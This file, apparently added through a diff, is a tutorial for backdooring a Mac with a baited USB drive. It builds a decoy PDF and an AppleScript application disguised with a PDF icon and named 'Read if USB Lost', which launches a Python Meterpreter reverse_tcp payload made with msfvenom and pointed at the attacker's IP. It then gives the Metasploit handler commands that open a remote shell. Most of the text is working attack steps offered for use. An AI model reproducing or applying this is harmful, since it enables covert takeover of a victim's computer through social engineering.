@@ -1,0 +1,65 @@
+Backdooring a Mac with Meterpreter (Social Engineering)
+
+Requires a Mac or an Applescript emulator
+
+Create a PDF File, saying something along the lines of 'Please email [Email Address] if you find this USB' Name it anything. Save it into a folder named 'Private' on your USB drive.
+
+Create a new text file. Paste the code below into it:
+
+#!/bin/bash/
+
+cd [Path to 'Private' Folder]
+python pyterpreter.py
+
+Save this file as TermsAndConditions.sh, and place it in the folder named 'Private'
+
+Create a second new text file. Paste the code below into it:
+
+#!/bin/bash
+
+open [Path to actual PDF file]
+
+Save this file as PrivacyPolicy.sh and place it in the 'Private' Folder
+
+Using the Applescript Editor on a Mac or an emulator for it, create a new file. Paste the code below into it:
+
+do shell script "bash [Path to TermsAndConditions.sh] & bash [Path to PrivacyPolicy.sh]"
+
+Export this file as an application, and name it something like 'Read if USB Lost'
+
+Spoof the icon. Right click on the file and click 'Get Info'. Get your PDF file icon, and drag it from it's folder into the top left corner of the 'Get Info' window. This will change the file icon. It is optional to spoof the file extension.
+
+Generate the payload
+
+msfvenom -p python/meterpreter/reverse_tcp LHOST=[Attacker's IP Address] LPORT=[Port Number] > pyterpreter.py
+
+This will generate a file named 'pyterpreter.py' in your home folder. Move this folder to the 'Private' folder on your USB
+
+Start Metasploit
+
+msfconsole
+
+Type these commands:
+
+use multi/handler
+
+set lhost [Attacker's IP Address]
+
+set lport [Port Number]
+
+set payload python/meterpreter/reverse_tcp
+
+exploit -j -z
+
+Wait for a connection
+
+Press enter to go back to the command line
+
+sessions
+
+sessions -i [session number]
+
+You are now in a meterpreter shell
+
+
+
